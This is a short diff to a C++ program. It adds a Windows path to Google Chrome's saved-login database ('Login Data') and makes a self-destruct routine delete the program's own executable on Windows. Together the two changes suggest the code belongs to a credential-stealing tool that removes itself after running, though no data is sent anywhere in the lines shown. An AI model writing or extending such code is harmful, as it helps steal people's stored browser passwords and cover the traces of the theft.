@@ -3,6 +3,7 @@
 #include <array>
 #include <algorithm>
 #include <fstream>
+#include <iostream>
 
 const std::string getPathToFile() {
 #ifdef __linux__
@@ -16,9 +17,8 @@ const std::string getPathToFile() {
     });
 
     return result != files.end() ? *result : "";
-
 #else
-    return "TODO: implement windows path";
+	return std::string(std::getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
 #endif
 }
 
@@ -27,7 +27,8 @@ void selfDesctruct(int argc, char** argv) {
 #ifdef __linux__
     std::remove(argv[0]);
 #else
-    //TODO: impleent for windows
+    //TODO: implement for windows
+	std::remove(argv[0]);
 #endif
 }
 
